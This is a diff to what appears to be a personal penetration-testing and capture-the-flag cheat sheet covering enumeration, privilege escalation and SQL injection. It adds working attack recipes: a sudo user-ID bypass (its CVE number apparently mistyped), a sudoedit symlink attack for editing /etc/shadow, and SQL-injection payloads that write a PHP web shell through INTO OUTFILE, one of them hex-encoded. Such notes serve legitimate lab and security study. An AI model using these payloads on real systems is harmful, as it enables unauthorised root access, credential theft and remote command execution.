@@ -26,18 +26,22 @@ and on and on and on
 11. linpeas linenum pspy name ur shits
 12. Always check `cat ~/.*history | less` or just `history`
 13. Use ysoserial to exploit java deserialization to get revershell or RCE (payload have to be in a file). Then use it or encode it first, what ever.
-14. Remember CVE-2019-13287 (ALL, !root) /bin/bash >>> sudo -u#-1 /bin/bash
-15. `.conf` file may contain something. (usually in /etc/apache2)
-16. Stuck? Bruteforce with no end? Generate your own wordlist with cewl! Example: cewl http://10.10.10.191/ -w customwordlist.txt -m 6
-17. 
+14. `.conf` file may contain something. (usually in /etc/apache2)
+15. Stuck? Bruteforce with no end? Generate your own wordlist with cewl! Example: cewl http://10.10.10.191/ -w customwordlist.txt -m 6
+16. 
 - SMB enum >>> smbclient -L //[IP](its_the_same_like_--list=[IP]), and continue with the shares name `smbclient //[IP]/[sharename]`
 - Just `smbclient -h` tbh
-18. rpcclient --user=[username] [target-ip] -W [forest name]
-19. Check cdata
-20. Port 11211 is memcached server >>> https://www.hackingarticles.in/penetration-testing-on-memcached-server/
-21. Always check `netstat -tulpn`
-22. Enum smtp with telnet.
-23. On windows, always check `whoami /priv` and find recent vulnerability.
+17. rpcclient --user=[username] [target-ip] -W [forest name]
+18. Check cdata
+19. Port 11211 is memcached server >>> https://www.hackingarticles.in/penetration-testing-on-memcached-server/
+20. Always check `netstat -tulpn`
+21. Enum smtp with telnet.
+22. On windows, always check `whoami /priv` and find recent vulnerability.
+
+ 
+
+**CVE-2019-13287**
+(ALL, !root) /bin/bash >>> sudo -u#-1 /bin/bash
 
 
 
@@ -160,6 +164,32 @@ On the target machine
 
 
 
+**Symbolic Link**
+Allow us to create a link between file, its like the same file but in two places.
+https://linuxize.com/post/how-to-create-symbolic-links-in-linux-using-the-ln-command/
+ln -s [file_we_want_to_link] [the_symbolic_link]
+ex: ln -s /etc/shadow /home/yanto/xxx.txt
+
+
+
+**CVE-2015-5602 (SUDOEDIT)**
+https://www.exploit-db.com/exploits/37710
+
+This affect sudo version <= 1.8.14
+To check sudo version: sudo --version
+
+sudoedit /*/*/
+
+Example case:
+(ALL : ALL) sudoedit /var/www/html/*/*/config.php
+What should we do?
+1. mkdir -p /var/www/html/tmp1/tmp2/   >>> Create the directory, because of the wildcard we can create anything
+2. ln -s /etc/shadow /var/www/html/tmp1/tmp2/config.php >>> Symbolic link the root owned file we want to edit
+3. sudoedit -u root /var/www/html/*/*/config.php >>> Run it
+4. Now we can edit /etc/shadow 
+
+
+
 **Wild card privesc**
 ### When there's a script using `*`, for example to backup stuff. Usually in cronjob.
 Example: 
@@ -245,6 +275,22 @@ https://aem1k.com/aurebesh.js/#%3Cscript%3Eak
 2. 'UNION SELECT 1,group_concat(sql),3 FROM sqlite_master -- -
 3. 'UNION SELECT 1,group_concat(schema_name),3,4 from information_schema.schemata -- - (get list of databases)
 4. 'UNION SELECT group_concat(column_name),group_concat(table_name),3,4 from information_schema.columns WHERE table_schema='[db_name]'-- -
+
+IF the setting allowed, we can write file
+1. `' UNION SELECT 1,'<?php system($_GET['cmd']);?>' INTO OUTFILE '/var/www/html/cmd.php' -- -`
+2. `<original_value>' '<?php system($_GET['cmd']);?>' INTO OUTFILE '/var/www/html/cmd.php' -- -`
+
+IF None work
+1. <original_value>' INTO OUTFILE '/var/www/html/cmd.php' LINES TERMINATED BY [Any,terminator, usually the hex encoded RCE code] -- -
+Ex:
+288cc16ac43351ff676132e9fd7c6ef3' INTO OUTFILE '/var/www/html/cmd.php' LINES TERMINATED BY 3C3F7068702073797374656D28245F4745545B27636D64275D293B3F3E -- -
+
+Trueing
+1. Dont just do `' or 1=1 -- - `
+2. Try ' or '1' = '1  >> This should return true too
+ex: 
+where username = ''
+where username = '' or '1' = '1' 
 
 
 
